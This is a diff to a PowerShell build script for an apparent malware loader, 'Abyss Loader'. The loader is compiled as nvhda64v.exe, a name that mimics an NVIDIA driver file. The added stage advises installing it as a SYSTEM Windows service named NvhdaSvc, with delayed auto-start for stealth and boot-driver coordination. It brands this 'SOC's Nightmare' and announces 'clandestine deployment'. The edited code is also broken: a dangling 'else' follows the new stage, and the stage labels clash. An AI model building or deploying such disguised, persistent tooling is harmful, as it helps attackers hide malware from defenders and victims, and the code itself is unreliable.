@@ -365,15 +365,36 @@ if ($LASTEXITCODE -eq 0) {
     $exePath = Join-Path $DistDir "nvhda64v.exe"
     if (Test-Path $exePath) {
         $exeSize = [math]::Round((Get-Item $exePath).Length / 1KB, 2)
-        Write-Success "Abyss Ghost Loader compiled: nvhda64v.exe ($exeSize KB)"
+        Write-Success "Level 4 Abyss Loader compiled: nvhda64v.exe ($exeSize KB)"
         
-        # Immediate cleanup
+        # Immediate cleanup of redundant runtime files if they exist (SingleFile should handle most)
         Get-ChildItem $DistDir -Filter *.json | Remove-Item -Force -ErrorAction SilentlyContinue
     }
     else {
-        Write-ErrorMsg "Build passed but NvContainer.exe not found. Check $buildLog"
+        Write-ErrorMsg "Build passed but nvhda64v.exe not found. Check $buildLog"
+        exit 1
     }
 }
+
+# ═══════════════════════════════════════════════════════════════════════════
+# STAGE 6: GHOST SERVICE & PERSISTENCE CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+Write-SectionHeader "STAGE 4.5: PERSISTENCE & GHOST CONFIG"
+
+Show-ProgressBar -Current 4 -Total 5 -Activity "Shadowing project artifacts..."
+
+Write-Status "Configuring Level 4 'SOC's Nightmare' Persistence..."
+$serviceName = "NvhdaSvc"
+$exeName = "nvhda64v.exe"
+
+# Deployment advice for Level 4
+Write-RGB "  → Deployment Strategy: Windows Service (SYSTEM)" -RGB $AbyssColors.ShadowGray
+Write-RGB "  → Persistence: Auto-Start (Delayed-Start recommended for stealth)" -RGB $AbyssColors.ShadowGray
+Write-RGB "  → Early Boot: Boot-Driver coordination enabled" -RGB $AbyssColors.ShadowGray
+
+Write-Host ""
+Write-Success "Abyss Level 4 Loader is ready for clandestine deployment."
 else {
     Write-ErrorMsg "Abyss Loader build FAILED. Last 10 lines of log:"
     Get-Content $buildLog | Select-Object -Last 10 | ForEach-Object {
